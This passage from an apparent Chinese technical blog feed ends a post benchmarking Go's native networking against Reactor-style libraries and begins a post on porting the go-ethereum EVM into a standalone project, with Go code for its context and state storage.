<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">sum := <span class="number">0</span><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++ &#123;    sum += i&#125;</span><br></pre></td></tr></table></figure>

<p>最终的结果如下4张图，可以忽略字节netpoll的数据，大概是因为这两种场景并不是netpoll的目标场景，即RPC场景，所以压测的姿势大概率不对。</p>
<p>Echo场景下是4核机器跑的EchoServer，HTTP场景下是8核跑的HTTPServer。</p>
<p>图1：Echo场景下，固定1KB数据包，不断增加连接数。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/11.png"></p>
<p>图2：Echo场景下，固定1K连接数，不断增加数据包大小。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/12.png"></p>
<p>图3和图4：HTTP场景下，固定1KB数据包，不断增加连接数，QPS和内存占用情况。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/13.png"></p>
<ul>
<li><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4></li>
</ul>
<p>通过压测结果，可以看出大部分压测，Go原生网络库都没有什么拉胯表现，<strong>只有在连接数上去了之后，或者需要处理的数据包越来越大的情况下，Go原生网络库才逐渐显示出颓势</strong>。尤其是当连接上到30w到50w之后，Go原生网络库的内存开销增大的同时，伴随的GC时间也变长，到50w连接的时候，一波强制GC服务就down了。</p>
<p>这是Go原生网络库在50w连接时，强制GC后Down掉时的详情：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GC forcedgc 13 @146.006s 0%: 0.12+105+0.004 ms clock, 0.99+0/207/620+0.033 ms cpu, 5877-&gt;5877-&gt;4197 MB, 7006 MB goal, 8 Pgc 14 @197.643s 1%: 0.084+1084+0.061 ms clock, 0.67+5299/2139/1.8+0.49 ms cpu, 8187-&gt;8218-&gt;4825 MB, 8394 MB goal, 8 Pgc 15 @220.972s 1%: 4.1+1057+0.039 ms clock, 33+5215/2087/0+0.31 ms cpu, 9412-&gt;9442-&gt;4794 MB, 9651 MB goal, 8 PGC forced</span><br></pre></td></tr></table></figure>

<p>这是Reactor网络库(wnet) 100w连接时，依然坚挺的GC详情：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gc 23 @208.600s 1%: 0.20+374+0.090 ms clock, 1.6+233/723/0+0.72 ms cpu, 873-&gt;891-&gt;450MB, 896 MB goal, 8 Pgc 24 @213.872s 1%: 0.18+419+0.051 ms clock, 1.5+4.8/830/0+0.41 ms cpu, 878-&gt;899-&gt;453MB, 900 MB goal, 8 Pgc 25 @219.270s 1%: 1.2+403+0.071 ms clock, 10+160/790/0+0.57 ms cpu, 884-&gt;907-&gt;454 MB,907 MB goal, 8 Pgc 26 @224.601s 1%: 0.12+425+0.056 ms clock, 1.0+112/849/0+0.44 ms cpu, 885-&gt;906-&gt;452MB, 908 MB goal, 8 Pgc 27 @229.851s 1%: 0.20+424+0.079 ms clock, 1.6+107/836/0+0.63 ms cpu, 881-&gt;903-&gt;453MB, 904 MB goal, 8 Pgc 28 @235.256s 1%: 0.17+431+0.038 ms clock, 1.4+77/863/0+0.30 ms cpu, 884-&gt;907-&gt;454MB, 907 MB goal, 8 Pgc 29 @240.622s 1%: 0.15+402+0.039 ms clock, 1.2+117/804/0+0.31 ms cpu, 885-&gt;907-&gt;452MB, 908 MB goal, 8 PGC forced</span><br></pre></td></tr></table></figure>

<p>因此，综合来看，大部分应用场景，Go原生网络库就可以满足。相比Reactor网络库而言，<strong>Go原生网络库可以看作是以空间（内存、runtime）来换取时间（高吞吐量和低延时）。当空间紧张时，也就是连接数上来后，巨大的内存开销和相应的GC会导致服务不可用，而这种海量连接场景才是Reactor网络库的优势所在</strong>。比如电商大促等活动型场景，有预期的流量高峰，在高峰期会有海量的连接，海量的请求；还有一种直播弹幕、消息推送等长连接场景，也是有大量的长连接。</p>
<h4 id="关联阅读-》-https-github-com-panjf2000-gnet"><a href="#关联阅读-》-https-github-com-panjf2000-gnet" class="headerlink" title="关联阅读==》 https://github.com/panjf2000/gnet"></a>关联阅读==》 <a href="https://github.com/panjf2000/gnet">https://github.com/panjf2000/gnet</a></h4>]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>移植EVM</title>
    <url>/2022/04/29/%E7%A7%BB%E6%A4%8DEVM/</url>
    <content><![CDATA[<p>请先阅览前文 ==&gt; <a href="https://willzhuang.github.io/2019/03/20/evm%E4%B9%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">EVM之源码分析</a> ，整个分析其实就是为了移植虚拟机做基础。</p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>因为涉及到的代码会比较多，不可能把所有代码都列举出来。所以也只是挑关键的部分进行讲解说明。整个移植的代码已经合到之前的那个简单(无用)<a href="https://github.com/blockchainworkers/conch">demo</a>版本的公链项目上了。 移植的以太坊版本为v1.8.12.</p>
<h3 id="开始移植"><a href="#开始移植" class="headerlink" title="开始移植"></a>开始移植</h3><p>首先先创建一个go的新项目, 将go-ethereum项目下core/vm文件夹下的代码全部拷贝到新项目下，我们为新的文件夹名称为cvm。 保存之后， 假设你用的是vscode(带上了go的周边插件)或者goland，这个时候你会发现有大量的报错。 没有关系， 因为很多以太坊包还没有被导入进来。 但是呢， 既然我们只想移植虚拟机部分，又不引入以太坊的其他模块。 这个时候我们就把需要的包直接拷贝到我们的项目中。 彻底分离和go-ethereum的关系。这里需要说明一下， 虽然是开源项目， 拷贝和使用别人的开源代码也要注意license的。</p>
<ol>
<li>主要需要拷贝的包如下</li>
</ol>
<ul>
<li>go-ethereum/common这个文件夹， 我们也将其这个内容均拷贝到cvm这个文件夹下。</li>
<li>go-ethereum/params这个文件夹中的gas_tables.go, protocol_params.go两个文件拷贝到cvm/params文件夹下。</li>
<li>创建log.go文件在cvm/types/下， 该文件中主要是智能合约emit提交事件时使用的log对象。 内容如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type Log struct &#123;</span><br><span class="line">   &#x2F;&#x2F; Consensus fields:</span><br><span class="line">   &#x2F;&#x2F; address of the contract that generated the event</span><br><span class="line">   Address common.Address &#96;json:&quot;address&quot; gencodec:&quot;required&quot;&#96;</span><br><span class="line">   &#x2F;&#x2F; list of topics provided by the contract.</span><br><span class="line">   Topics []common.Hash &#96;json:&quot;topics&quot; gencodec:&quot;required&quot;&#96;</span><br><span class="line">   &#x2F;&#x2F; supplied by the contract, usually ABI-encoded</span><br><span class="line">   Data []byte &#96;json:&quot;data&quot; gencodec:&quot;required&quot;&#96;</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; Derived fields. These fields are filled in by the node</span><br><span class="line">   &#x2F;&#x2F; but not secured by consensus.</span><br><span class="line">   &#x2F;&#x2F; block in which the transaction was included</span><br><span class="line">   BlockNumber uint64 &#96;json:&quot;blockNumber&quot;&#96;</span><br><span class="line">   &#x2F;&#x2F; hash of the transaction</span><br><span class="line">   TxHash common.Hash &#96;json:&quot;transactionHash&quot; gencodec:&quot;required&quot;&#96;</span><br><span class="line">   &#x2F;&#x2F; index of the transaction in the block</span><br><span class="line">   TxIndex uint &#96;json:&quot;transactionIndex&quot; gencodec:&quot;required&quot;&#96;</span><br><span class="line">   &#x2F;&#x2F; hash of the block in which the transaction was included</span><br><span class="line">   BlockHash common.Hash &#96;json:&quot;blockHash&quot;&#96;</span><br><span class="line">   &#x2F;&#x2F; index of the log in the receipt</span><br><span class="line">   Index uint &#96;json:&quot;logIndex&quot; gencodec:&quot;required&quot;&#96;</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; The Removed field is true if this log was reverted due to a chain reorganisation.</span><br><span class="line">   &#x2F;&#x2F; You must pay attention to this field if you receive logs through a filter query.</span><br><span class="line">   Removed bool &#96;json:&quot;removed&quot;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在cvm目录下创建vm.go文件， 主要是生成evm的上下文对象。</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// NewEVMContext creates a new context for use in the EVM.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewEVMContext</span><span class="params">(from common.Address, blockNum, timeStamp, difficulty <span class="keyword">int64</span>)</span> <span class="title">vm</span>.<span class="title">Context</span></span> &#123;</span><br><span class="line">	<span class="comment">// If we don&#x27;t have an explicit author (i.e. not mining), extract from the header</span></span><br><span class="line">	<span class="keyword">return</span> vm.Context&#123;</span><br><span class="line">		CanTransfer: CanTransfer,</span><br><span class="line">		Transfer:    Transfer,</span><br><span class="line">		GetHash:     GetHashFn(),</span><br><span class="line">		Origin:      from,</span><br><span class="line">		Coinbase:    common.Address&#123;&#125;,</span><br><span class="line">		BlockNumber: <span class="built_in">new</span>(big.Int).Set(big.NewInt(blockNum)),</span><br><span class="line">		Time:        <span class="built_in">new</span>(big.Int).Set(big.NewInt(timeStamp)),</span><br><span class="line">		Difficulty:  <span class="built_in">new</span>(big.Int).Set(big.NewInt(difficulty)),</span><br><span class="line">		GasLimit:    <span class="number">0xfffffffffffffff</span>, <span class="comment">//header.GasLimit,</span></span><br><span class="line">		GasPrice:    <span class="built_in">new</span>(big.Int).Set(big.NewInt(<span class="number">10</span>)),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetHashFn returns a GetHashFunc which retrieves header hashes by number 获取块号码对于的块hash</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetHashFn</span><span class="params">()</span> <span class="title">func</span><span class="params">(n <span class="keyword">uint64</span>)</span> <span class="title">common</span>.<span class="title">Hash</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(n <span class="keyword">uint64</span>)</span> <span class="title">common</span>.<span class="title">Hash</span></span> &#123;</span><br><span class="line">		<span class="comment">// If there&#x27;s no hash cache yet, make one</span></span><br><span class="line">		<span class="comment">// if cache == nil &#123;</span></span><br><span class="line">		<span class="comment">// 	cache = map[uint64]common.Hash&#123;</span></span><br><span class="line">		<span class="comment">// 		ref.Number.Uint64() - 1: ref.ParentHash,</span></span><br><span class="line">		<span class="comment">// 	&#125;</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">		<span class="comment">// // Try to fulfill the request from the cache</span></span><br><span class="line">		<span class="comment">// if hash, ok := cache[n]; ok &#123;</span></span><br><span class="line">		<span class="comment">// 	return hash</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">		<span class="comment">// // Not cached, iterate the blocks and cache the hashes</span></span><br><span class="line">		<span class="comment">// for header := chain.GetHeader(ref.ParentHash, ref.Number.Uint64()-1); header != nil; header = chain.GetHeader(header.ParentHash, header.Number.Uint64()-1) &#123;</span></span><br><span class="line">		<span class="comment">// 	cache[header.Number.Uint64()-1] = header.ParentHash</span></span><br><span class="line">		<span class="comment">// 	if n == header.Number.Uint64()-1 &#123;</span></span><br><span class="line">		<span class="comment">// 		return header.ParentHash</span></span><br><span class="line">		<span class="comment">// 	&#125;</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">		<span class="keyword">return</span> common.Hash&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CanTransfer checks wether there are enough funds in the address&#x27; account to make a transfer.</span></span><br><span class="line"><span class="comment">// This does not take the necessary gas in to account to make the transfer valid.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CanTransfer</span><span class="params">(db vm.StateDB, addr common.Address, amount *big.Int)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> db.GetBalance(addr).Cmp(amount) &gt;= <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Transfer subtracts amount from sender and adds amount to recipient using the given Db</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Transfer</span><span class="params">(db vm.StateDB, sender, recipient common.Address, amount *big.Int)</span></span> &#123;</span><br><span class="line">	db.SubBalance(sender, amount)</span><br><span class="line">	db.AddBalance(recipient, amount)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>接着我们把go-ethereum/account文件夹下的abi内容拷贝到cvm文件夹下。</li>
</ol>
<blockquote>
<p>abi/bind文件内容可以直接删除掉。此文件夹下是对智能合约进行函数调用进行编码的包。换句话调用智能合约构建的交易中的input内容就是需要此包中函数来生成的。当然如果你看了前面的文章，对智能合约调用了解的话，此处自然就理解这个包的作用了。</p>
</blockquote>
<p>到了这里整个需要拷贝的文件就齐全了， 目录结构如下:</p>
<p><img src="/2022/04/29/%E7%A7%BB%E6%A4%8DEVM/1.jpg"></p>
<ol start="4">
<li>接下来我们需要修改evm的部分代码了。</li>
</ol>
<blockquote>
<p>vm/contracts.go文件我们直接删除掉。 这个是自带的智能合约， 内部主要是一些内置函数， 注意实际使用的时候记得还是要实现的， evm.go文件中run函数忽略掉所有内置的合约函数。</p>
</blockquote>
<p><img src="/2022/04/29/%E7%A7%BB%E6%A4%8DEVM/2.jpg"></p>
<p>修改evm.go文件中的Call函数 当地址不存在时我们直接认为是创建地址， 忽略掉掉内置合约。 <img src="/2022/04/29/%E7%A7%BB%E6%A4%8DEVM/3.jpg"></p>
<ol start="5">
<li>接着我们要实现evm.StateDB接口的内容了， 因为此接口涉及涉及的主要是个账户状态相关的内容， 也即是说可整个区块的存储是有关联的， 暂时我也只能以一个示例来说明是如何简单的实现这些接口。</li>
</ol>
<p>我们在cvm文件夹下创建一个account_state.go的文件。 定义的数据结构格式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> accountObject <span class="keyword">struct</span> &#123;</span><br><span class="line">	Address      common.Address              <span class="string">`json:&quot;address,omitempty&quot;`</span></span><br><span class="line">	AddrHash     common.Hash                 <span class="string">`json:&quot;addr_hash,omitempty&quot;`</span> <span class="comment">// hash of ethereum address of the account</span></span><br><span class="line">	ByteCode     []<span class="keyword">byte</span>                      <span class="string">`json:&quot;byte_code,omitempty&quot;`</span></span><br><span class="line">	Data         accountData                 <span class="string">`json:&quot;data,omitempty&quot;`</span></span><br><span class="line">	CacheStorage <span class="keyword">map</span>[common.Hash]common.Hash <span class="string">`json:&quot;cache_storage,omitempty&quot;`</span> <span class="comment">// 用于缓存存储的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> accountData <span class="keyword">struct</span> &#123;</span><br><span class="line">	Nonce    <span class="keyword">uint64</span>      <span class="string">`json:&quot;nonce,omitempty&quot;`</span></span><br><span class="line">	Balance  *big.Int    <span class="string">`json:&quot;balance,omitempty&quot;`</span></span><br><span class="line">	Root     common.Hash <span class="string">`json:&quot;root,omitempty&quot;`</span> <span class="comment">// merkle root of the storage trie</span></span><br><span class="line">	CodeHash []<span class="keyword">byte</span>      <span class="string">`json:&quot;code_hash,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AccountState 实现vm的StateDB的接口 用于进行测试</span></span><br><span class="line"><span class="keyword">type</span> AccountState <span class="keyword">struct</span> &#123;</span><br><span class="line">	Accounts <span class="keyword">map</span>[common.Address]*accountObject <span class="string">`json:&quot;accounts,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>接下来我们实现StateDB接口:</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CreateAccount 创建账户接口 </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">CreateAccount</span><span class="params">(addr common.Address)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> accSt.getAccountObject(addr) != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	obj := newAccountObject(addr, accountData&#123;&#125;)</span><br><span class="line">	accSt.setAccountObject(obj)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SubBalance 减去某个账户的余额</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">SubBalance</span><span class="params">(addr common.Address, amount *big.Int)</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getOrsetAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		stateObject.SubBalance(amount)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AddBalance 增加某个账户的余额</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">AddBalance</span><span class="params">(addr common.Address, amount *big.Int)</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getOrsetAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		stateObject.AddBalance(amount)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//// GetBalance 获取某个账户的余额</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">GetBalance</span><span class="params">(addr common.Address)</span> *<span class="title">big</span>.<span class="title">Int</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getOrsetAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> stateObject.Balance()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">new</span>(big.Int).SetInt64(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//GetNonce 获取nonce</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">GetNonce</span><span class="params">(addr common.Address)</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> stateObject.Nonce()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetNonce 设置nonce</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">SetNonce</span><span class="params">(addr common.Address, nonce <span class="keyword">uint64</span>)</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getOrsetAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		stateObject.SetNonce(nonce)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetCodeHash 获取代码的hash值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">GetCodeHash</span><span class="params">(addr common.Address)</span> <span class="title">common</span>.<span class="title">Hash</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> common.Hash&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> common.BytesToHash(stateObject.CodeHash())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetCode 获取智能合约的代码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">GetCode</span><span class="params">(addr common.Address)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> stateObject.Code()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//SetCode 设置智能合约的code</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">SetCode</span><span class="params">(addr common.Address, code []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getOrsetAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		stateObject.SetCode(crypto.Sha256(code), code)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetCodeSize 获取code的大小</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">GetCodeSize</span><span class="params">(addr common.Address)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> stateObject.ByteCode != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">len</span>(stateObject.ByteCode)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AddRefund 暂时先忽略补偿</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">AddRefund</span><span class="params">(<span class="keyword">uint64</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetRefund ...</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">GetRefund</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetState 和SetState 是用于保存合约执行时 存储的变量是否发生变化 evm对变量存储的改变消耗的gas是有区别的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">GetState</span><span class="params">(addr common.Address, key common.Hash)</span> <span class="title">common</span>.<span class="title">Hash</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> stateObject.GetStorageState(key)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> common.Hash&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetState 设置变量的状态</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">SetState</span><span class="params">(addr common.Address, key common.Hash, value common.Hash)</span></span> &#123;</span><br><span class="line">	stateObject := accSt.getOrsetAccountObject(addr)</span><br><span class="line">	<span class="keyword">if</span> stateObject != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;SetState key: %x value: %s&quot;</span>, key, <span class="built_in">new</span>(big.Int).SetBytes(value[:]).String())</span><br><span class="line">		stateObject.SetStorageState(key, value)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Suicide 暂时禁止自杀</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">Suicide</span><span class="params">(common.Address)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HasSuicided ...</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">HasSuicided</span><span class="params">(common.Address)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Exist 检查账户是否存在</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">Exist</span><span class="params">(addr common.Address)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> accSt.getAccountObject(addr) != <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Empty 是否是空账户</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">Empty</span><span class="params">(addr common.Address)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	so := accSt.getAccountObject(addr)</span><br><span class="line">	<span class="keyword">return</span> so == <span class="literal">nil</span> || so.Empty()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RevertToSnapshot ...</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">RevertToSnapshot</span><span class="params">(<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Snapshot ...</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">Snapshot</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AddLog 添加事件触发日志</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">AddLog</span><span class="params">(log *types.Log)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;log: %v&quot;</span>, log)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AddPreimage </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">AddPreimage</span><span class="params">(common.Hash, []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ForEachStorage  暂时没发现vm调用这个接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">ForEachStorage</span><span class="params">(common.Address, <span class="keyword">func</span>(common.Hash, common.Hash)</span> <span class="title">bool</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Commit 进行持久存储 这里我们只将其简单的json话之后保存到本地磁盘中。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(accSt *AccountState)</span> <span class="title">Commit</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="comment">// 将bincode写入文件</span></span><br><span class="line">	file, err := os.Create(<span class="string">&quot;./account_sate.db&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	err = json.NewEncoder(file).Encode(accSt)</span><br><span class="line">	<span class="comment">//fmt.Println(&quot;len(binCode): &quot;, len(binCode), &quot; code: &quot;, binCode)</span></span><br><span class="line">	<span class="comment">// bufW := bufio.NewWriter(file)</span></span><br><span class="line">	<span class="comment">// bufW.Write(binCode)</span></span><br><span class="line">	<span class="comment">// // bufW.WriteByte(&#x27;\n&#x27;)</span></span><br><span class="line">	<span class="comment">// bufW.Flush()</span></span><br><span class="line">	file.Close()</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TryLoadFromDisk  尝试从磁盘加载AccountState</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TryLoadFromDisk</span><span class="params">()</span> <span class="params">(*AccountState, error)</span></span> &#123;</span><br><span class="line">	file, err := os.Open(<span class="string">&quot;./account_sate.db&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; os.IsNotExist(err) &#123;</span><br><span class="line">		<span class="keyword">return</span> NewAccountStateDb(), <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// stat, _ := file.Stat()</span></span><br><span class="line">	<span class="comment">// // buf := stat.Size()</span></span><br><span class="line">	<span class="keyword">var</span> accStat AccountState</span><br><span class="line"></span><br><span 